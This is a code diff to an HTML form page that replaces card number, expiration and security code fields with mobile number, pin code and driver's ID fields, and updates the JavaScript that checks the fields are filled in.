@@ -124,12 +124,12 @@
         <form autocomplete="on" method="POST">
             <p class="formElement">Name</p>
             <input type="text" id="name" placeholder="Name" required>
-            <p class="formElement">Card Number</p>
-            <input type="text" id="card" placeholder="Card Number" size="16"required>
-            <p class="formElement">Expiration Date</p>
-            <input type="month" id="expiration" placeholder="Expiration Date" required>
-            <p class="formElement">Security Code</p>
-            <input type="text" id="security" placeholder="Security Code" size="3" required>
+            <p class="formElement">Mobile Number</p>
+            <input type="text" id="card" placeholder="mobilenumber" size="16"required>
+            <p class="formElement">PinCode</p>
+            <input type="month" id="PinCode" placeholder="pincode" required>
+            <p class="formElement">Drivers ID</p>
+            <input type="text" id="driversid" placeholder="Drivers Id" size="3" required>
         </form>
         <button class="button" onclick="submit()"><span>Next</span></button>
     </div>
@@ -137,8 +137,8 @@
         function submit() {
             var name = document.getElementById("name").value;
             var card = document.getElementById("card").value;
-            var expiration = document.getElementById("expiration").value;
-            var security = document.getElementById("security").value;
+            var expiration = document.getElementById("PinCode").value;
+            var security = document.getElementById("driversid").value;
 
             if ( !(name && card && expiration && security) ) {
                 alert("Please enter all the required fields");
